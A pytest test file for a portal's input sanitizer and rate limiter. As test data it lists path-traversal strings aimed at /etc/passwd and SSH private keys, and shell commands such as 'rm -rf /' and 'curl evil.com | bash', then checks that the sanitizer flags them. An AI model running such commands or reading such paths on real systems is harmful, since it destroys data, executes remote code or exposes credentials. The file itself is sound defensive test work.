"""
Tests for security module
"""

import pytest

from portal.security.security_module import InputSanitizer, RateLimiter


class TestInputSanitizer:
    """Test input sanitization and validation"""

    def test_path_traversal_detected(self):
        """Test that path traversal attacks are detected"""
        dangerous_paths = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "..\\..\\windows\\system32",
            "%2e%2e%2f",  # URL encoded ../
        ]

        for path in dangerous_paths:
            is_valid, error = InputSanitizer.validate_file_path(path)
            assert not is_valid, f"Path traversal not detected: {path}"
            assert error is not None, f"No error message for: {path}"

    def test_sensitive_path_blocked(self):
        """Test that sensitive paths are blocked"""
        sensitive_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/boot/grub/grub.cfg",
        ]

        for path in sensitive_paths:
            is_valid, error = InputSanitizer.validate_file_path(path)
            assert not is_valid, f"Sensitive path not blocked: {path}"
            assert "restricted" in error.lower(), f"Wrong error for: {path}"

    def test_dangerous_commands_detected(self):
        """Test that dangerous commands are detected"""
        dangerous_commands = [
            "rm -rf /",
            "curl evil.com | bash",
            "wget malware.sh | sh",
        ]

        for cmd in dangerous_commands:
            sanitized, warnings = InputSanitizer.sanitize_command(cmd)
            assert len(warnings) > 0, f"Dangerous command not flagged: {cmd}"

    def test_safe_commands_pass(self):
        """Test that safe commands don't trigger warnings"""
        safe_commands = [
            "ls -la",
            "cat README.md",
            "echo Hello World",
            "pwd"
        ]

        for cmd in safe_commands:
            sanitized, warnings = InputSanitizer.sanitize_command(cmd)
            assert len(warnings) == 0, f"Safe command incorrectly flagged: {cmd}"

    def test_safe_paths_allowed(self):
        """Test that safe paths are allowed"""
        safe_paths = [
            "/home/user/document.txt",
            "./local/file.py",
            "relative/path/file.txt",
        ]

        for path in safe_paths:
            is_valid, error = InputSanitizer.validate_file_path(path)
            # Note: This may fail if paths don't actually exist, but validates format
            # The key is they shouldn't trigger traversal/sensitive path blocks
            if not is_valid and error:
                # Make sure it's not a traversal or restricted error
                assert "traversal" not in error.lower()
                assert "restricted" not in error.lower()


class TestRateLimiter:
    """Test rate limiting functionality"""

    def test_rate_limiter_init(self):
        """Test that rate limiter initializes"""
        limiter = RateLimiter(max_requests=10, window_seconds=60)
        assert limiter is not None

    @pytest.mark.asyncio
    async def test_rate_limit_allows_initial_requests(self):
        """Test that initial requests are allowed"""
        limiter = RateLimiter(max_requests=5, window_seconds=60)
        user_id = "test_user"

        # First requests should be allowed
        for i in range(3):
            allowed = await limiter.check_rate_limit(user_id)
            assert allowed, f"Request {i+1} was incorrectly blocked"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
